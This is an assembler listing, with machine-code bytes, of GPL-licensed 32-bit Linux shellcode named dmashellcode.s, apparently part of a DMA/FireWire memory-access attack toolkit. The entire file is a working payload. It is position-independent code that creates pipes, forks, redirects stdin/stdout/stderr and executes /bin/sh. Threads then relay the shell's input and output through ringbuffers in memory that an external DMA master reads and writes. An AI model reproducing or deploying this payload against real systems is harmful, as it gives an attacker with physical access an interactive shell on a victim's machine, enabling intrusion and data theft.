     1                                  ;
     2                                  ; $Id: dmashellcode.s 331 2007-01-30 03:18:20Z lostrace $
     3                                  ;
     4                                  ; dmashellcode.s: communicate with a DMA master via two ringbuffers
     5                                  ;	and relay all data between the master and a forked shell.
     6                                  ;
     7                                  ; Copyright (C) 2007
     8                                  ; losTrace aka "David R. Piegdon"
     9                                  ;
    10                                  ; This program is free software; you can redistribute it and/or modify
    11                                  ; it under the terms of the GNU General Public License version 2, as
    12                                  ; published by the Free Software Foundation.
    13                                  ;
    14                                  ; This program is distributed in the hope that it will be useful,
    15                                  ; but WITHOUT ANY WARRANTY; without even the implied warranty of
    16                                  ; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    17                                  ; GNU General Public License for more details.
    18                                  ;
    19                                  ; You should have received a copy of the GNU General Public License
    20                                  ; along with this program; if not, write to the Free Software
    21                                  ; Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
    22                                  ;
    23                                  
    24                                  BITS 32
    25                                  
    26                                  ;		     #   1   2   3   4   5   6
    27                                  ; syscall arguments: EAX EBX ECX EDX ESI EDI EBP
    28                                  ; syscall return: EAX
    29                                  
    30                                  ;
    31                                  ; http://www.lxhp.in-berlin.de/lhpsyscal.html
    32                                  ;
    33                                  ; all necessary system calls:
    34                                  ; ===========================
    35                                  ;
    36                                  ; clone:	eax: 120
    37                                  ; 		ebx: clone-flags
    38                                  ; 		ecx: ptr to top of (distinct) stack space
    39                                  ; 		edx: ptr to pt_regs or NULL
    40                                  ;
    41                                  ; close:	eax: 6
    42                                  ; 		ebx: fd to close
    43                                  ;
    44                                  ; dup2:	eax: 63
    45                                  ; 		ebx: fd 2 dup
    46                                  ; 		ecx: fd to assign the dup to
    47                                  ;
    48                                  ; execve:	eax: 11
    49                                  ; 		ebx: ptr to string of program path&name
    50                                  ; 		ecx: ptr to argv[]
    51                                  ; 		edx: ptr to envv[]
    52                                  ;
    53                                  ; exit:	eax: 1
    54                                  ; 		ebx: exit code
    55                                  ;
    56                                  ; fcntl:	eax: 55
    57                                  ; 		ebx: fd
    58                                  ; 		ecx: command code
    59                                  ; 		edx: file locks: ptr to writable struct flock
    60                                  ;
    61                                  ; fork:	eax: 2
    62                                  ; 		ebx... are passed to forked process.
    63                                  ;
    64                                  ; kill:	eax: 37
    65                                  ; 		ebx: pid (?)
    66                                  ; 		ecx: signal (?)
    67                                  ; 		SIGKILL = 9
    68                                  ;
    69                                  ; nanosleep:	eax: 162
    70                                  ; 		ebx: ptr to struct timespec
    71                                  ; 		ecx: ptr to alterable struct timespec
    72                                  ;
    73                                  ; read:	eax: 3
    74                                  ; 		ebx: fd
    75                                  ; 		ecx: ptr to buffer
    76                                  ; 		edx: count
    77                                  ;
    78                                  ; write:	eax: 4
    79                                  ; 		ebx: fd
    80                                  ; 		ecx: ptr to buffer
    81                                  ; 		edx: count
    82                                  ;
    83                                  ; pipe:	eax: 42
    84                                  ; 		ebx: ptr to dword[2]
    85                                  ;
    86                                  
    87                                  start:
    88 00000000 E800000000              	call near shcode_start
    89                                  shcode_start:
    90 00000005 5D                      	pop	ebp
    91 00000006 81C509020000            	add	ebp, data_start - shcode_start
    92                                  
    93                                  	; pipe(m2sh)
    94 0000000C 31C0                    	xor	eax,eax
    95 0000000E B02A                    	mov	al,42
    96 00000010 89EB                    	mov	ebx,ebp
    97 00000012 81C316000000            	add	ebx,m2sh_0
    98 00000018 CD80                    	int	0x80
    99                                  
   100 0000001A 85C0                    	test	eax,eax
   101 0000001C 751E                    	jnz	child_dead_interleaved
   102                                  
   103                                  	; pipe(sh2m)
   104 0000001E 31C0                    	xor	eax,eax
   105 00000020 B02A                    	mov	al,42
   106 00000022 89EB                    	mov	ebx,ebp
   107 00000024 81C31E000000            	add	ebx,sh2m_0
   108 0000002A CD80                    	int	0x80
   109                                  
   110 0000002C 85C0                    	test	eax,eax
   111 0000002E 750C                    	jnz	child_dead_interleaved
   112                                  
   113                                  	; fork()
   114 00000030 31C0                    	xor	eax,eax
   115 00000032 B002                    	mov	al,2
   116 00000034 CD80                    	int	0x80
   117                                  
   118 00000036 85C0                    	test	eax,eax
   119 00000038 7407                    	jz	child
   120 0000003A 7959                    	jns	parent			; signed > 0 ?
   121                                  child_dead_interleaved:
   122 0000003C E995010000              	jmp	child_dead
   123                                  
   124                                  child:
   125                                  	; dup2(m2sh[0], 0)   (dup to stdin)
   126 00000041 31C0                    	xor	eax,eax
   127 00000043 B03F                    	mov	al,63
   128 00000045 8B9D16000000            	mov	ebx,[ebp+m2sh_0]
   129 0000004B 31C9                    	xor	ecx,ecx
   130 0000004D CD80                    	int	0x80
   131                                  
   132 0000004F 39C8                    	cmp	eax,ecx
   133 00000051 753D                    	jne	leave_sh_interleaved
   134                                  
   135                                  	; dup2(sh2m[1], 1)   (dup to stdout)
   136                                  	; for sure: EAX is 0.
   137                                  	;xor	eax,eax
   138 00000053 B03F                    	mov	al,63
   139 00000055 8B9D22000000            	mov	ebx,[ebp+sh2m_1]
   140 0000005B 41                      	inc	ecx
   141 0000005C CD80                    	int	0x80
   142                                  
   143 0000005E 39C8                    	cmp	eax,ecx
   144 00000060 752E                    	jne	leave_sh_interleaved
   145                                  
   146                                  	; dup2(sh2m[1], 2)   (dup to stderr)
   147 00000062 31C0                    	xor	eax,eax
   148 00000064 B03F                    	mov	al,63
   149                                  ;	mov	ebx,[ebp+sh2m_1]
   150 00000066 41                      	inc	ecx
   151 00000067 CD80                    	int	0x80
   152                                  
   153 00000069 39C8                    	cmp	eax,ecx
   154 0000006B 7523                    	jne	leave_sh_interleaved
   155                                  
   156                                  	; execve("/bin/sh", ["/bin/sh",NULL], [NULL])
   157 0000006D 31C0                    	xor	eax,eax
   158 0000006F B00B                    	mov	al,11
   159 00000071 89EB                    	mov	ebx,ebp
   160 00000073 81C309000000            	add	ebx,execve_command		; ebx -> '/bin/sh',0
   161                                  
   162 00000079 89E9                    	mov	ecx,ebp
   163 0000007B 81C126020000            	add	ecx,foo				; ecx -> foo
   164                                  
   165 00000081 31D2                    	xor	edx,edx
   166 00000083 8919                    	mov	[ecx],ebx			; foo := @'/bin/sh',0
   167 00000085 895104                  	mov	[ecx+4],edx			; bar := NULL
   168 00000088 89CA                    	mov	edx,ecx
   169 0000008A 42                      	inc	edx
   170 0000008B 42                      	inc	edx
   171 0000008C 42                      	inc	edx
   172 0000008D 42                      	inc	edx				; edx -> bar
   173 0000008E CD80                    	int	0x80
   174                                  
   175                                  	; fail if execve did not work.
   176                                  leave_sh_interleaved:
   177 00000090 E972010000              	jmp	leave_sh
   178                                  
   179                                  parent:
   180                                  	; remember child's PID
   181 00000095 898512000000            	mov	[ebp+child_pid],eax
   182                                  
   183                                  	; close(m2sh[0])
   184 0000009B 31C0                    	xor	eax,eax
   185 0000009D B006                    	mov	al,6
   186 0000009F 8B9D16000000            	mov	ebx,[ebp+m2sh_0]
   187 000000A5 CD80                    	int	0x80
   188                                  
   189                                  	; close(sh2m[1])
   190 000000A7 31C0                    	xor	eax,eax
   191 000000A9 B006                    	mov	al,6
   192 000000AB 8B9D22000000            	mov	ebx,[ebp+sh2m_1]
   193 000000B1 CD80                    	int	0x80
   194                                  
   195                                  	; clone:
   196                                  	; one thread for reader, one thread for writer
   197 000000B3 31C0                    	xor	eax,eax
   198 000000B5 B078                    	mov	al,120
   199                                  	; CLONE_FS   | CLONE_FILES | CLONE_SIGHAND | CLONE_VM   | CLONE_THREAD
   200                                  	; 0x00000200 | 0x00000400  | 0x00000800    | 0x00000100 | 0x00010000
   201                                  	; CLONE_PTRACE = 0x00002000
   202 000000B7 BB000F0100              	mov	ebx,0x00010f00
   203 000000BC 89E1                    	mov	ecx,esp	; just use same stack with a delta of 64
   204 000000BE 81EC40000000            	sub	esp,64 ; we need the stack only a tiny bit.
   205 000000C4 31D2                    	xor	edx,edx
   206 000000C6 CD80                    	int	0x80
   207                                  
   208 000000C8 85C0                    	test	eax,eax
   209                                  	; ret=0 -> clone
   210 000000CA 7407                    	jz	thread_write_to_master_interleaved	; clone is writer
   211                                  	; ret>0 (signed) -> original
   212 000000CC 790A                    	jns	thread_read_from_master			; original is reader
   213                                  	; error if ret<0
   214 000000CE E903010000              	jmp	child_dead
   215                                  
   216                                  thread_write_to_master_interleaved:
   217 000000D3 E985000000              	jmp	thread_write_to_master
   218                                  
   219                                  	; ==================================== the READER thread:
   220                                  thread_read_from_master:
   221                                  	; will write to child via m2sh[1]
   222                                  	; remember RINGBUFFER from_master in esi
   223 000000D8 89EE                    	mov	esi,ebp
   224 000000DA 81C626000000            	add	esi,rfrm_buffer
   225                                  
   226                                  reader_while_fds_ok:
   227                                  	; while both FDs are ok:
   228 000000E0 8A8503000000            	mov	al,[ebp+to_child_ok]
   229 000000E6 028504000000            	add	al,[ebp+from_child_ok]
   230 000000EC 3C02                    	cmp	al,2
   231 000000EE 7549                    	jne	leave_sh_second_interleaved
   232                                  
   233                                  	; test, if master requested child to be terminated
   234 000000F0 8A8502000000            	mov	al,[ebp+terminate_child]
   235 000000F6 84C0                    	test	al,al
   236 000000F8 754B                    	jnz	do_terminate_child
   237                                  
   238                                  	; if ringbuffer is EMPTY ( _reader == _writer ), do nothing.
   239 000000FA 31C0                    	xor	eax,eax
   240 000000FC 8A8505000000            	mov	al,[ebp+rfrm_writer_pos]
   241 00000102 2A8506000000            	sub	al,[ebp+rfrm_reader_pos]
   242 00000108 84C0                    	test	al,al
   243 0000010A 7432                    	jz	reader_sleep
   244                                  
   245                                  	; EAX/AL is the number of bytes to be written to the child.
   246                                  
   247                                  	; write a single byte to the child.
   248 0000010C 31C0                    	xor	eax,eax
   249 0000010E B004                    	mov	al,4
   250 00000110 8B9D1A000000            	mov	ebx,[ebp+m2sh_1]	; EBX := m2sh[1]
   251 00000116 31C9                    	xor	ecx,ecx
   252 00000118 8A8D06000000            	mov	cl,[ebp+rfrm_reader_pos]
   253 0000011E 01F1                    	add	ecx,esi			; ECX := reader_pos + buffer_base
   254 00000120 31D2                    	xor	edx,edx
   255 00000122 42                      	inc	edx			; EDX := 1
   256 00000123 CD80                    	int	0x80
   257                                  
   258                                  	; we wrote 1 byte, thus syscall should return 1 in EAX.
   259 00000125 48                      	dec	eax
   260 00000126 7409                    	jz	reader_write_to_child_ok
   261                                  
   262 00000128 C6850300000000          	mov byte [ebp+to_child_ok], 0
   263 0000012F EBAF                    	jmp	reader_while_fds_ok
   264                                  
   265                                  reader_write_to_child_ok:
   266                                  	; mark byte as read:
   267 00000131 FE8506000000            	inc byte [ebp+rfrm_reader_pos]
   268 00000137 EBA7                    	jmp	reader_while_fds_ok
   269                                  
   270                                  leave_sh_second_interleaved:
   271 00000139 E9C9000000              	jmp	leave_sh
   272                                  
   273                                  reader_sleep:
   274 0000013E E876000000              	call	sleep_short
   275 00000143 EB9B                    	jmp	reader_while_fds_ok
   276                                  
   277                                  do_terminate_child:
   278                                  	; reset flag
   279 00000145 31C0                    	xor	eax,eax
   280 00000147 888502000000            	mov	[ebp+terminate_child],al
   281                                  	; send a SIGKILL to child
   282 0000014D B025                    	mov	al,37
   283 0000014F 8B9D12000000            	mov	ebx,[ebp+child_pid]
   284 00000155 31C9                    	xor	ecx,ecx
   285 00000157 B109                    	mov	cl,9	; SIGKILL
   286 00000159 CD80                    	int	0x80
   287                                  
   288                                  ;	; clear to_child_ok
   289                                  ;	xor	eax,eax
   290                                  ;	mov	[ebp+to_child_ok], eax
   291                                  ;	; and from_child_ok
   292                                  ;	mov	[ebp+from_child_ok], eax
   293                                  ;	jmp	leave_sh
   294                                  
   295                                  	; don't terminate, wait for child to close pipes. maybe it just relays the signal to other child.
   296 0000015B EB83                    	jmp	reader_while_fds_ok
   297                                  
   298                                  	; ==================================== the WRITER thread:
   299                                  thread_write_to_master:
   300                                  	; will read from child via sh2m[0]
   301                                  	; remember RINGBUFFER to_master in esi
   302 0000015D 89EE                    	mov	esi,ebp
   303 0000015F 81C626010000            	add	esi,rto_buffer
   304                                  
   305                                  writer_while_fds_ok:
   306                                  	; while both FDs are ok:
   307 00000165 8A8503000000            	mov	al,[ebp+to_child_ok]
   308 0000016B 028504000000            	add	al,[ebp+from_child_ok]
   309 00000171 3C02                    	cmp	al,2
   310 00000173 7561                    	jne	child_dead
   311                                  
   312                                  	; if ringbuffer is FULL ( _reader == _writer+1 ), do nothing.
   313 00000175 8A8507000000            	mov	al,[ebp+rto_writer_pos]
   314 0000017B FEC0                    	inc	al
   315 0000017D 2A8508000000            	sub	al,[ebp+rto_reader_pos]
   316 00000183 742D                    	jz	writer_sleep
   317                                  
   318                                  	; read ONE SINGLE BYTE and pass it into the buffer.
   319 00000185 31C0                    	xor	eax,eax
   320 00000187 B003                    	mov	al,3
   321 00000189 8B9D1E000000            	mov	ebx,[ebp+sh2m_0]
   322 0000018F 31C9                    	xor	ecx,ecx
   323 00000191 8A8D07000000            	mov	cl,[ebp+rto_writer_pos]
   324 00000197 01F1                    	add	ecx,esi
   325 00000199 31D2                    	xor	edx,edx
   326 0000019B 42                      	inc	edx
   327 0000019C CD80                    	int	0x80
   328                                  
   329                                  	; we read one byte. syscall should return 1 in EAX.
   330 0000019E 48                      	dec	eax
   331 0000019F 7409                    	jz	writer_read_from_child_ok
   332                                  
   333 000001A1 C6850400000000          	mov byte [ebp+from_child_ok],0
   334 000001A8 EBBB                    	jmp	writer_while_fds_ok
   335                                  
   336                                  writer_read_from_child_ok:
   337 000001AA FE8507000000            	inc byte [ebp+rto_writer_pos]
   338                                  
   339                                  	; we don't need to sleep inside the loop. only sleep, if ringbuffer is full.
   340                                  	; read() will block if there is no data from child.
   341 000001B0 EBB3                    	jmp	writer_while_fds_ok
   342                                  
   343                                  writer_sleep:
   344 000001B2 E802000000              	call	sleep_short
   345 000001B7 EBAC                    	jmp	writer_while_fds_ok
   346                                  
   347                                  	; ==================================================================
   348                                  
   349                                  sleep_short:
   350                                  	; sleep 0.001 seconds:
   351                                  	; usleep(0,1000000);
   352 000001B9 31C0                    	xor	eax,eax
   353 000001BB B0A2                    	mov	al, 162
   354 000001BD 89EB                    	mov	ebx, ebp
   355 000001BF 81C326020000            	add	ebx, foo
   356 000001C5 89D9                    	mov	ecx, ebx
   357 000001C7 31D2                    	xor	edx,edx
   358 000001C9 8913                    	mov long [ebx], edx		; seconds
   359 000001CB BAA0860100              	mov	edx,100000
   360 000001D0 895304                  	mov long [ebx+4], edx		; nanoseconds
   361 000001D3 CD80                    	int	0x80
   362                                  
   363 000001D5 C3                      	ret
   364                                  
   365                                  child_dead:
   366                                  	; at most wait 2 seconds for master's ACK
   367 000001D6 31C0                    	xor	eax,eax
   368 000001D8 388501000000            	cmp	[ebp+child_is_dead_ACK], al
   369 000001DE 7527                    	jne	leave_sh
   370 000001E0 B002                    	mov	al,2
   371 000001E2 388500000000            	cmp	[ebp+child_is_dead], al
   372 000001E8 771D                    	ja	leave_sh
   373                                  
   374 000001EA FE4500                  	inc byte [ebp]
   375                                  
   376                                  	; usleep(1,0):
   377 000001ED 31C0                    	xor	eax,eax
   378 000001EF B0A2                    	mov	al, 162
   379 000001F1 89EB                    	mov	ebx, ebp
   380 000001F3 81C326020000            	add	ebx, foo
   381 000001F9 89D9                    	mov	ecx, ebx
   382 000001FB 31D2                    	xor	edx,edx
   383 000001FD 895304                  	mov long [ebx+4], edx		; nanoseconds
   384 00000200 42                      	inc	edx
   385 00000201 8913                    	mov long [ebx], edx		; seconds
   386 00000203 CD80                    	int	0x80
   387                                  
   388 00000205 EBCF                    	jmp	child_dead
   389                                  
   390                                  leave_sh:
   391                                  	; exit-point for BOTH parent:writer&reader and child in case of fail
   392 00000207 31C0                    	xor	eax,eax
   393 00000209 89C3                    	mov	ebx,eax
   394 0000020B 40                      	inc	eax
   395 0000020C CD80                    	int	0x80
   396                                  
   397                                  ; =============================================================================
   398                                  ; DATA
   399                                  data_start EQU $
   400                                  
   401                                  ; do not change order of the following stuff!
   402                                  
   403                                  child_is_dead EQU $ - data_start
   404 0000020E 00                      	db		0
   405                                  child_is_dead_ACK EQU $ - data_start
   406 0000020F 00                      	db		0
   407                                  
   408                                  terminate_child	EQU $ - data_start
   409 00000210 00                      	db		0
   410                                  
   411                                  to_child_ok EQU $ - data_start
   412 00000211 01                      	db		1
   413                                  from_child_ok EQU $ - data_start
   414 00000212 01                      	db		1
   415                                  
   416                                  ; a ringbuffer is EMPTY, if both _writer and _reader point to the same location.
   417                                  ; a ringbuffer is FULL, if _reader == _writer+1
   418                                  
   419                                  ; ringbuffer from_master:
   420                                  
   421                                  rfrm_writer_pos EQU $ - data_start
   422 00000213 00                      	db		0
   423                                  rfrm_reader_pos EQU $ - data_start
   424 00000214 00                      	db		0
   425                                  
   426                                  ; ringbuffer to_master:
   427                                  
   428                                  rto_writer_pos EQU $ - data_start
   429 00000215 00                      	db		0
   430                                  rto_reader_pos EQU $ - data_start
   431 00000216 00                      	db		0
   432                                  
   433                                  execve_command EQU $ - data_start
   434 00000217 2F62696E2F736800        	db	'/bin/sh',0
   435                                  
   436                                  ; =============================================================================
   437                                  ; stuff that is not required to be initialized:
   438 0000021F 90                      align 4
   439                                  
   440                                  child_pid EQU $ - data_start
   441                                  
   442                                  ; pipes middleman<->shell
   443                                  m2sh_0 EQU $ - data_start + 4			; shell reads
   444                                  m2sh_1 EQU $ - data_start + 8			; master writes
   445                                  sh2m_0 EQU $ - data_start + 12			; master reads
   446                                  sh2m_1 EQU $ - data_start + 16			; shell writes
   447                                  
   448                                  rfrm_buffer EQU $ - data_start + 20		; FROM master
   449                                  rto_buffer EQU $ - data_start + 276		; TO master
   450                                  
   451                                  foo EQU $ - data_start + 532
   452                                  bar EQU $ - data_start + 536
   453                                  
